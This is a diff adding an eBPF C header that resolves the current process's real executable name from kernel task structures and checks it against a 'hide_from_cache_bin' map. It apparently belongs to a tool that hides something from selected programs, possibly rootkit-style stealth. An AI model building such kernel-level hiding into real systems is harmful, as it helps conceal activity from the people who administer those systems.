@@ -1,0 +1,55 @@
+/**
+ * Contains bpf utility functions non like utils.h 
+ * 
+ * @author Yekuuun
+ */
+
+#ifndef BPF_COMMON_H
+#define BPF_COMMON_H
+
+#include "../includes/bpf_config.h"
+
+/**
+ * Base function to resolve real binary filename. Avoiding using comm since is easily updatable.
+ * 
+ * @param dst  => buffer to contain result (note : the *dst contains enough memory for result)
+ * @param sdst => strlen of *dst
+ * 
+ * @return 0 if success, < 0 if error.
+ */
+static __always_inline int __resolve_exe_basename(char *dst, size_t sdst){
+    struct task_struct *tsk = (void*)bpf_get_current_task();
+    if(!tsk)
+        return -1;
+
+    struct mm_struct *mm = BPF_CORE_READ(tsk, mm);
+    if(!mm) //kernel thread => no binary.
+        return -1;
+
+    struct file *exe = BPF_CORE_READ(mm, exe_file);
+    if(!exe)
+        return -1;
+
+    const unsigned char *name = BPF_CORE_READ(exe, f_path.dentry, d_name.name);
+    if(!name)
+        return -1;
+
+    return bpf_core_read_str(dst, sdst, name);
+}
+
+/**
+ * Utility function to check in hide_from_cache has bin target.
+ */
+static __always_inline int __is_target_bin(void){
+    char bin[DNAME_MAX] = {0};
+    if(__resolve_exe_basename(bin, sizeof(bin)) < 0)
+        return 0;
+    
+    __u8 *bin_cache_flag = bpf_map_lookup_elem(&hide_from_cache_bin, &bin);
+    if(!bin_cache_flag)
+        return 0;
+
+    return *bin_cache_flag == 1;
+}
+
+#endif
